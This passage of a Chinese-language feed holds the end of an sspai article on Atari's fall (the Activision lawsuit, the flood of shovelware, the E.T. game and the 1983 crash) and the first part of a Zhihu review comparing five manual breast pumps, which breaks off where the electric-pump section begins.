展会之后，雷蒙·凯撒就写信警告过动视不要打雅达利的主意，然而此时的动视早已通过逆向破解的方式制造出了自己的 Atari 2600 开发机，并开始着手建立销售网络；3 月份，动视公开了他们开发的四款首发游戏，明摆着就是要和雅达利死磕到底。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/ce61c05b69d51df1a2273971a4f110c1.png\"><figcaption>《Pitfal!》是由动视开发和发行的首款游戏，也是 Atari 2600 平台上最畅销的作品之一。</figcaption></figure><p>1980 年 5 月，怒不可遏的雅达利用一纸诉状将动视告上了法庭。雅达利认为动视的做法破坏了自己的游戏开发、发行与销售业务，对自己的合法权益造成了严重损害，并在法庭上一再强调动视逆向破解 Atari 2600 和在未经许可的情况下制作和发行游戏软件的行为属于犯罪，诉求勒令动视即刻停止一切侵权行为，并且支付高达两千万美元的赔偿金。</p>\n<p>显然，雅达利法务部没有迪士尼法务部的「超能力」，他们的如意算盘是动用「钞能力」，在赔偿金额上狮子大开口，以这种方法「哄抬」官司成本，企图以高额的诉讼费用拖垮对手。这样，动视即使胜诉，却也要付出一笔惨痛的代价，足以令其一蹶不振，永无翻身之地。然而，令雅达利想不到的是，动视的扩张速度远超他们的想象。</p>\n<h3>「谁有钱就挣谁的！」</h3>\n<p>时任动视 CEO 的吉姆·莱维（Jim Levy）此前曾从事出版行业，也有在唱片公司的工作经历，所以他的经营策略也更加偏向对游戏和开发者的包装，很有如今「饭圈」的那一套。莱维认为「游戏开发者也是艺术家」，也乐于给开发者以艺术家的待遇，动视发行的游戏会在包装盒上印刷开发者的签名照和寄语，并且还会介绍游戏开发的背景故事和幕后「花絮」。<strong>莱维的理念不仅激励了被雅达利长期压迫的游戏开发者，也促进了开发者与玩家在屏幕之外直接或间接的互动，改变了以往游戏行业照搬传统出版物进行宣发活动的老套做法</strong>。</p>\n<p>接下来的剧情似乎毫无悬念，1980 年 7 月，动视的四款首发游戏上市，在玩家间受到了前所未有的热烈欢迎，这家一开始只有八名员工的小公司在一年之内的收入高达 650 万美元，雅达利的计划在动视的成功面前不攻自破，此时摆在其面前的就只剩下了一条路。</p>\n<h3>「让子弹飞一会。」</h3>\n<p>事情到了这个地步，无论是对雅达利还是对动视来说，这场诉讼的结果都变得尤其重要。<strong>对于刚在游戏行业站稳脚跟的动视来说，赢得诉讼就等于名正言顺的拿到了市场准入的通行证；而对于财大气粗的雅达利来说，输掉诉讼就相当于为自己在市场的长期垄断刻下了墓志铭</strong>。商业竞争并无高尚和卑鄙之分，但如果比较动视和雅达利各自所处的地位和表现出的姿态，这场诉讼显然更像是屠龙者与恶龙之间的较量。</p>\n<p>1981 年 11 月，雅达利和动视之间漫长的官司终于落下帷幕，法院认为雅达利基于其市场支配地位、出于排除和限制竞争的目的所提出的诉求违反了反托拉斯法的相关规定，故驳回其诉求，宣判雅达利败诉。<strong>作为英美法系国家，美国的判例法制度源远流长，所以雅达利的败诉发出了一个极其重要的信号 —— 即任何人都可以在美国合法的开发和销售 Atari 2600 平台的游戏软件。</strong>诉讼结果让雅达利垄断下的游戏市场从此门户洞开，作为赢家的动视自然成为了受益方，但在判例之下，无数觊觎着雅达利财产的眼睛也开始蠢蠢欲动。</p>\n<h2>「旧日支配者」的「心思」有多坏？</h2>\n<p>几乎是在一夜之间，无数曾被雅达利拒之门外的游戏开发商「如闪电般归来」，并迅速展开了与雅达利的单方面「跨界联动」，企图在动视胜诉的「风口」上分一杯羹。虽然新晋的第三方游戏中不乏佳作，但这些优质游戏的数量相对于涌入市场的粗制滥造和鱼目混珠之作来说只是杯水车薪。在那个游戏媒体还不甚发达的年代，玩家们要判断一款游戏的优劣只能依靠口口相传，然而在面对几乎挤爆了货架的陌生游戏时，这种方法很快失去了使用价值。</p>\n<p>从此，买卡带变成了「开盲盒」，而玩家想要在如此恶劣的环境下买到一个质量还行的新游戏，其难度不亚于抽到盲盒的「隐藏款」。同时，一些包含暴力、血腥、色情元素，甚至带有强烈种族主义色彩和极端主义倾向的游戏都堂而皇之地出现在了雅达利的游戏机上，这口黑锅自然也一并被舆论扣在了雅达利的身上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jlb34teh5fkvebg.jpeg\"><figcaption>自雅达利败诉之后，Atari 2600 上充斥着各种滥竽充数之作。</figcaption></figure><p>从此，整个北美大陆的游戏市场开始了「劣币驱逐良币」的恶性循环，刚刚闯入陌生市场的游戏开发商学不会动视对游戏品质的严格把控，却在极短的时间内熟练掌握了动视在游戏宣发上的精髓。游戏卡带的包装越来越精美，故事越编越动人，IP 越来越重量级，游戏内容却越来越枯燥乏味，<s> 像极了现在的手游行业 </s> 。然而，面对已经开始失控的市场，雅达利依然不肯放下身段，而是转而制定了更加激进的策略。</p>\n<h3>「 I have a plan! A big! Plan! 」</h3>\n<p>为了转嫁矛盾，雅达利转而开始向销售网络中的分销商和零售商施压，逼迫这些商家订购超出需求的卡带数量，以消化过分积压的库存。但商家不是傻瓜，雅达利销售网络中的商家为了规避风险和扩大规模，也同时订购和销售第三方的卡带，这似乎构成了一种双赢的局面，看上去雅达利减轻了库存压力，第三方游戏开发商拓宽了销售渠道，所有人都很高兴 —— 除了玩家。</p>\n<p>不满的情绪开始在玩家群体中蔓延，但首先撑不住的不是玩家，而是商家。雅达利庞大的体量下近乎「恐怖」的产能和库存数量并非是向商家强行摊派就能解决的，况且雅达利此举的目的是为了更新自家的游戏阵容，从而保持对第三方游戏开发商的竞争力。因此，雅达利在消化库存的同时也在变本加厉的生产新的卡带，而与此同时，大量的第三方游戏依然在疯狂的涌入市场，所有卖不出去的卡带最后全部变成了压在商家身上的沉重负担。<strong>整个游戏市场就像暴雨中即将决堤的河流，无数的淘金者逆流而上，所有人都想在这条浑水中多捞一笔，却没有一个人发现那座即将溃于蚁穴的千里之堤</strong>。</p>\n<h3>「团长，车子已经准备好了！」</h3>\n<p>大家都很高兴的 1982 年一直高兴到了年末，然后就高兴不下去了。在雅达利第一方与第三方游戏的「通力协作」下，销售网络的承压能力和混乱程度已经达到了极限，雅达利不知道有多少商家依然在销售自己的游戏，而商家也不知道自己到底和雅达利等开发商签下了多少订单，可谓是「兵不识将，将不识兵」，宋太祖一定没想到自己的国策竟然被一千年以后的美国资本家给玩明白了。</p>\n<p>事情发展到如此地步，是个明眼人都已经看出了这其中的门道，商家开始将已订购的卡带做退货处理，但雅达利并未把退回的卡带从总销售额中扣除。这种人为营造的「虚假繁荣」进一步恶化了市场环境，粗制滥造的游戏已经泛滥成灾，玩家的情绪就像巴尔干半岛上的火药桶，但谁也没有想到，这一年的圣诞节则成为了半岛上的「萨拉热窝」。</p>\n<h2>「旧日支配者」的「终局」有多惨？</h2>\n<p>阿兰·摩尔（Alan Moore）的漫画《致命玩笑》中，小丑在 1985 年的圣诞夜用一支转轮手枪将芭芭拉打入了 ICU；而现实世界中，霍华德·斯科特·华沙（Howard Scott Warshaw）在 1982 年的圣诞夜用一部《E.T.》游戏把雅达利钉上了耻辱柱。</p>\n<p>由史蒂芬·斯皮尔伯格（Steven Allan Spielberg）执导，于1982 年 6 月上映的《E.T.》电影是科幻电影史上的里程碑。在流媒体尚未出现的 80 年代，这部电影的受欢迎程度远超如今的所谓互联网「顶流」。雅达利「最大的敌人」—— 时代华纳自然不会放过蹭这个 IP 的机会，为了拿到电影改编权，也为了顺道拯救雅达利的销量，时代华纳开始频繁与环球影业和斯皮尔伯格接触，因为雅达利此前制作过斯皮尔伯格的另一部电影《夺宝奇兵》的改编游戏，其销量和口碑都相当不错，所以时代华纳没费多大力气（<s>也就砸了 2000 万美元</s>）就拿到了《E.T.》电影的改编权。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0jtb34teh3cl8mdg.jpeg\"><figcaption>从精美的《E.T.》游戏海报及其展示的包装封绘上可以看到时代华纳和雅达利对这款游戏的莫名自信。</figcaption></figure><h3>「致命玩笑」</h3>\n<p>雅达利上下对《E.T.》这个千载难逢的 IP 充满期待，为了表示诚意，雅达利高层决定让《夺宝奇兵》游戏的制作人霍华德负责这个项目。在 20 万美元薪酬和免费度假的许诺后，雅达利提出了唯一的要求：整个游戏要在五周之内开发完毕。</p>\n<p>摆在霍华德面前的只有两条路：要么拿着 20 万美元去夏威夷，要么抱着铺盖卷走人回家。虽然老板提出的要求实在过于阴间，但霍华德做出了一个碳基生物应有的选择。在霍华德夜以继日进行着开发工作的时候，时代华纳和雅达利正忙着为这部连他们自己都还不知道长什么样子的「旷世巨作」广而告之。报刊、杂志、广播、电视，甚至街边的商店橱窗商都挤满了《E.T.》游戏的广告，简直可以算作精神污染。</p>\n<p><strong>《E.T.》游戏从立项到完成的过程很像现在的一些现象级手游，开发商花重金砸下热门 IP，又极尽所能的为其造势铺路，唯独不肯在游戏开发上多下心思，其后的口碑和销量一落千丈直至黯然离场也是可以轻易预见的</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5au0k5b34teh5fkvec0.png\"><figcaption>《E.T.》游戏的这口黑锅实在不该由开发者霍华德来背。</figcaption></figure><p>1982 年的圣诞节，《E.T.》游戏如期上架，雅达利没有像自己的电视广告里一样给全美国的孩子们一个大大的「Surprise」，而是以极为低劣的游戏质量给了所有人一个大大的「Surprise Mother F**ker」。<strong>有人认为《E.T.》游戏是开发者霍华德对雅达利的无声报复，实际上，《E.T.》游戏的完成度对于只有五周的开发时间来说已经相当之高，被称作「史上最烂游戏」并非完全出于对游戏质量的评价，主要原因还是因为其实机表现和广告宣传的强烈反差，以及百万销量带来的知名度</strong>。</p>\n<p>如果要客观的评价《E.T.》游戏，倒不如直接问问游戏行业的从业者。</p>\n<blockquote><p>要在五周时间内开发一款 3A 大作是什么样的体验？</p></blockquote>\n<h3>「凛冬将至」</h3>\n<p>玩家群体的怒火终于在 1982 年圣诞节的雪夜爆发，已经售出的上百万张卡带中有不少在当夜就已经「横尸街头」。过于乐观的雅达利对《E.T.》游戏的备货相当充足，在圣诞节前加急生产的四百万张卡带除去上述的一百万张之外，剩下的全部积压在商家的货架上和雅达利自己的仓库里，即使打折幅度堪比 Steam 特卖也依然没人买账。<strong>受够了「欺诈式营销」的玩家从此失去了对雅达利乃至整个游戏行业的最后一点信任，无数的游戏机和卡带在一夜之间变成了无人问津的电子垃圾；深感市场前景一片灰暗的投资方纷纷也与游戏产业一刀两断，既为亡羊补牢，也为明哲保身；而借此机会不断唱衰电子游戏的媒体则在舆论上声讨雅达利长久以来的无耻行径，持续数月的「饱和打击」之下，整个北美的游戏市场变得如同废土一般死寂</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/01/552544fdf7b5fb2a50861eef3f4451b3.png\"><figcaption>雅达利的时代随着无数滞销的卡带一并，被人遗忘在了新墨西哥州阿拉莫戈多垃圾场的茫茫沙海之中。</figcaption></figure><p>在这场被命名为「雅达利冲击」的大崩溃中，雅达利既首当其冲，又难逃其咎。但是对于雅达利来说，数十亿的资产蒸发倒还是小事，此时最重要的是时代华纳的态度。但这位一手制造了当下局面的「始作俑者」并未显露出一丝愧疚，时代华纳只是瞟了一眼形如败犬的雅达利，就像雅达利瞟向那些曾为自己呕心沥血的开发人员一样。此时此刻，雅达利也只剩下了一句话。</p>\n<h2>「那我走？」</h2>\n<p>雅达利的崩溃直接导致了时代华纳的股价大跌，时任时代华纳 CEO 的史蒂夫·罗斯（Steve Ross）决定将雅达利拆分出售以缓解经营压力。曾经的雅达利从此一分为二，变成了雅达利集团和雅达利游戏，前者于 1984 年 7 月被出售给了 Commodore 的创始人杰克·特拉梅尔（Jack Tramiel），而后者则于 1985 年 2 月被南梦宫收购。归于南梦宫麾下的雅达利游戏并没有就此销声匿迹，在不久之后，这家脱胎于游戏巨头雅达利的「天选之子」将在大洋彼岸再次掀起游戏业界的一片腥风血雨 —— 不过，那就是另一个故事了。</p>\n<h2>参考文献</h2>\n<ul>\n<li><a href=\"https://www.163.com/ent/article/CM6PJUKU00318QE8.html\" target=\"_blank\">北美主机市场的崩溃，罪魁祸首竟是动视？</a></li>\n<li><a href=\"https://www.gcores.com/articles/131144\" target=\"_blank\">动视的四十一年（上）| 机核 GCORES</a></li>\n<li><a href=\"https://www.yystv.cn/p/958\" target=\"_blank\">史上最烂游戏表示：雅达利倒闭这个锅我不背 - 游研社</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Atari\" target=\"_blank\">Atari – Wikipedia</a></li>\n<li><a href=\"https://de.wikipedia.org/wiki/Activision\">Activision – Wikipedia</a></li>\n<li>本文部分图片来自 <a href=\"https://www.gcores.com/\" target=\"_blank\">机核网</a> 与 <a href=\"https://zh.wikipedia.org/\">维基百科</a>\n</li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69078"},{"title":"有没有好用的吸奶器推荐？","date":"2021-10-08 06:32:08","description":"\n<h3>测评完这些吸奶器，我感觉把娃奶到18岁都没问题了，哈哈哈！</h3>\n<p><img src=\"https://pic3.zhimg.com/v2-d28aef32c580051fd3aaa686a9d232fd_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>大家好！我是一直在母乳路上升级打怪的 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a>，很荣幸成为知乎#翻牌众测 的吸奶器测评嘉宾。<b>本篇测评产品由知友提出，未接受任何品牌植入或合作邀约。</b></p>\n<p>本篇吸奶器测评价位从59元~10000元不等，包含手动吸奶器，电动吸奶器，以及手电一体吸奶器。</p>\n<p>测评方式，包含<b><u>主观体验感受</u></b>以及<b><u>客观测试结果</u></b>。我将尽量详细充分地向大家展示每款产品的特点，以便大家选出最适合自己的吸奶器产品。</p>\n<h2><b>Ⅰ 手动吸奶器</b></h2>\n<p>手动吸奶器我总共购买了5个品牌，分别为新贝、十月结晶、小雅象、美德乐、兰思诺。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-949dc1a2f84e339989222f0d2aafc06e_720w.jpg?rss\" data-rawwidth=\"673\" data-rawheight=\"204\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>除美德乐外，手动吸奶器普遍价格都在百元以内。兰思诺由于是手电一体机，所以价格在另外一个档位上。</p>\n<p>手动吸奶器相比电动吸奶器的优势在于它<b>1.价格便宜</b>，<b>2.非常轻便</b>，<b>3.操作起来没有任何噪音</b>。由于是自己的手去按压，所以力度堪称无极调节，4.很容易找到自己<b>舒适的力度</b>。但是它带来的缺点是，<b>手很累，效率低，耗时长</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cad58cda7307112443a11426e6e6512b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在这几款手动吸奶器的体验中，<b>美德乐以它最贵的价格在体验感上拔得头筹。</b>新贝和小雅象的价格差不多，实际体验也差异不是很大。下面我分别写一下每款吸奶器的使用感受：</p>\n<h3><b>一、美德乐和韵｜手动之神</b></h3>\n<p><b>美德乐手动吸奶器在这几个里面是最贵的，体验感也是最好的。适合有预算且需要手动吸奶器的妈妈。</b></p>\n<p>它的安装说明清晰明了，很适合新手妈妈操作。手柄握起来舒适顺滑，可以360度旋转，找到自己最喜欢的角度。按压短柄用于按摩,按压长柄用于深吸排乳。我在奶胀的时候测评，十分钟挤出了40ml，乳房基本被排空了，业务能力很可。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-af80ca18f39372f8a24eaf7e362d159b_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>喇叭罩外围是一圈硅胶材质，贴到乳房上也比较柔软亲肤。吸乳护罩支持21mm/24mm/27mm/30mm四种不同尺寸，选择算很多的。下单一般默认发24mm，这个也是最普遍的尺寸。</p>\n<p>但是它也有缺点！首先就是它有<b>1.清洁死角</b>，网上居然没人提！下图处是乳汁流向奶瓶的通道，狭长窄小还有转弯，很难洗到呀！需要买那种非常细小的吸管刷才能深入到里面，清洗并不方便。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d7585d9377a2cb45bb5b3592d0ae85fc_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>其次是<b>2.奶瓶口是所有测评产品中最窄的</b>，海绵刷得用力才能挤进去清洗，不明白为什么美德乐要设计窄瓶口？有了解的可以留言告诉我，谢谢。最后<b>3.奶毫升刻度从50ml起标</b>，这个我作为奶渣妈妈表示不满。像我这种单边最多排40ml，30ml，甚至有时候发挥不好只能拔20ml的妈妈就不配拥有精准测量的权利么（哭泣）~很多妈妈并不是一开始使用吸奶器就有很多奶的哦！建议美德乐品牌可以考虑增加一些50ml以下刻度的精准测量，多印几行字花不了几个钱，但是能换妈妈们攀爬奶量时“可确认”的开心~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-acc513deb732af444cd0a658a133f960_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-8f31a3a3b884e01f84fd818e34c3ad9c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-7408ccd2ebc414728afad0340a97e7d5_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈30ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742238587633664\"></a><h3><b>二、新贝手动吸奶器</b></h3>\n<p>我很认可它家本次测评的电动吸奶器，这个后面详写。<b>手动吸奶器表现中规中矩</b>，不过毕竟价格也只需要59元，倒也不亏。我在奶胀的时候测评，十分钟挤出了30ml，乳房不算排得很空，业务能力打个良好吧。<b>适合有一定预算限制，对吸奶器也没特别需求的妈妈。</b></p>\n<p>它不用自行安装，新手妈妈买来基本就能用了。而且它配了一副多触点的硅胶按摩乳罩，可以在吸奶的同时，通过按摩乳房周边的乳腺，改善涨奶疼痛。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1365fe6b59058542b5d9814572c06d06_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>新贝手动吸奶器还一个有心之处是，附赠了奶嘴。排出奶后直接盖上奶嘴就能给宝宝喝了，而不是像其他几款产品还得倒出来装到另外的奶瓶里。妈妈们每次少洗一个奶瓶看起来没什么，累积起来的量是非常令人愉悦的。而且没有清洗死角。乳汁留向奶瓶的通道不算狭窄，奶嘴刷就能洗到。</p>\n<p>但令我费解的是，为什么要加一个<b>1.垫圈</b>呢？嵌在里面每次很难取出来。是为了密封性能好吗？那为什么很多其他品牌可以不用加呢？多1个垫圈妈妈们就需要多洗1个配件呀！另外就是<b>2.手柄按压起来不算很轻盈</b>，所以扣点分。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b1e6ba0694e2c8dd0e3df91a6ef0aaa2_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"垫圈较难取出来\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-92a1a32f9b97cba18bc0343d107b988d_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>❤️<b>客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-5b0d42a4632b2b2fc32d7ef8bdd702d8_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈25ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742549725409280\"></a><h3><b>三、十月结晶手动吸奶器</b></h3>\n<p>我对十月结晶的很多产品印象都很好，但这款手动吸奶器除外。有点恨铁不成钢：“人家术业有专攻，你在干啥呢？”总体来说，<b>暂时不太推荐购买</b>。</p>\n<p>它也是不需要安装的，新手妈妈买来基本就能用了，这点很好。也多加了硅胶护罩，但遗憾的是，我使用时并没感觉有被按摩到。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-612fcc6ea867d3664a7701a3e28da67d_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>此外，十月结晶的<b>1.手柄握压起来并不太顺滑</b>。同价位新贝和小雅象的手柄握压起来都非常平滑，有“无极调节”的感觉。但十月结晶的握压起来，会有顿挫感。不知道是不是与上盖设计的回弹气囊有关，整体上<b>2.体验感不佳</b>。</p>\n<p>它最大的优点是，完全没有清洁死角，所有角落都能清洗到！</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-de2361d6fac752d9c6f8c01f6b7a6360_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-c22204d3200fc41027327547fe819f23_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈20ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428742836901113856\"></a><h3><b>四、小雅象奕轻手动吸奶器</b></h3>\n<p>小雅象这款产品有点创新，它打破了传统手动吸奶器不可调节吸力的弊端，<b>设有两档吸力调节，可以自己调节档位，控制吸奶的速度和力度</b>。我在奶胀的时候测评，十分钟挤出约30ml。<b>适合有一定预算限制，没什么额外需求并想追求外观的妈妈。</b></p>\n<p>它同样是免安装的，新手妈妈买来洗完就能用。小雅象在喇叭口设计了亲肤的小白圈，触感柔软贴合胸部曲线。它里面贴心地放了24mm和 28mm两个喇叭口，给了妈妈们更多的选择。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8113efffc7544621b3db338f0c193691_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款吸奶器没有清洁死角，洁癖妈妈OK。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9069904c464b167b1aff24b811f8f56a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"虽然有垫圈，但垫圈很好取出\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>手柄握感柔软顺滑，但缺点是<b>1.相对其他几款按压起来没那么轻盈</b>，手要用到的力气会偏大一些，所以容易累些。</p>\n<p>另一个缺点是<b>2.奶水通道不是透明的</b>，它挡着了部分视线，看不到乳头出奶情况，少了些成就感。虽然可以通过下面的瓶身看到，但总体视觉上是不太习惯的。<b>3.它也有垫圈</b>，清洗会多一步，但是比新贝的好取出来些。</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-97ba8629d24cfdbca6fa33e0366c3a49_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-9c830b693238df3151ba318b8c40c8ae_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈25ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1428743125195624448\"></a><h3><b>五、兰思诺手电一体吸奶器</b></h3>\n<p>这款吸奶器最特别，它<b>既可以手动也可以电动，适合希望能一机多用的妈妈</b>。我在奶胀的时候测评，十分钟排出约30ml，吸力相对其他几款较小。虽然既定时间内没排空，但很舒适，我这种疼痛敏感型妈妈会比较喜欢。</p>\n<p>兰思诺手动吸奶器握起来非常轻盈舒适，是相对省力的一款。硅胶边缘可以很舒适地贴合妈妈的胸部。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-013204cdc270aadc4357a9fef68b68ef_720w.jpg?rss\" data-rawwidth=\"1998\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这款吸奶器也没有什么清洗死角，最狭长的部位用小奶嘴刷可以清洗到。</p>\n<p>因为它是手电一体，所以<b>1.安装起来相对其他几款较为复杂</b>。而且<b>2.居然没有安装视频</b>，只能靠翻阅说明书来拼装。新手妈妈如果没有吸奶器使用经验的话，首次使用可能会比较迷茫。</p>\n<p>❤️<b>吸力演示</b></p>\n<blockquote>用注水气球模拟乳房，展示吸吮情况。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-d4a3a3ebf7d03e0c6e9a16b04e611880_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，用吸奶器吸水1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic1.zhimg.com/v2-12298c213afb0923899999cc191b6482_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"541\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：1分钟≈30ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429720042312876032\"></a><p><b>五款手动吸奶器的展示就到这里。</b></p>\n<p>最后我想提醒下新手妈妈们，如果想买手动吸奶器，建议先考虑下三个问题。<u>1.自己奶量是否稳定；2.乳腺是否畅通；3.奶阵会不会比较容易刺激出来</u>。如果都“是”的话，手动吸奶器足以，效率也会比较高。<b>如果奶量本身不多，需要多刺激泌乳提升奶量的话，使用手动吸奶器就很耗费耐心，也比较劳累。所以我更推荐后者选择电动且双边的吸奶器。</b></p>\n<p>下面是本次电动吸奶器的测评。</p>\n<h2><b>Ⅱ 